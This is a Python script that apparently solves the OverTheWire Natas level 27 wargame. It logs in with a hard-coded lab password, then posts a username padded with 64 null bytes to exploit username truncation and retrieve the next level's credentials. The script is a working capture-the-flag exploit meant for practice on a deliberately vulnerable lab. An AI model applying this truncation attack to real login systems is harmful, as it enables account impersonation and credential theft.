import requests

base_url = "http://natas27.natas.labs.overthewire.org/index.php"

username = "natas27"
password = "PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3"

s = requests.session()

print("First request")
response = s.post(base_url, data={'username': 'natas28' + '\0' * 64 + 'x', 'password': ''}, auth=(username,password))
print("="*80)
print(response.text.split("<body>")[1].split("</body>")[0].replace("<br>","\n"))
print("="*80)

print("Second request")
response = s.post(base_url, data={'username': 'natas28', 'password': ''}, auth=(username, password))


print("="*80)
print(response.text.split("<body>")[1].split("</body>")[0].replace("<br>","\n"))
print("="*80)
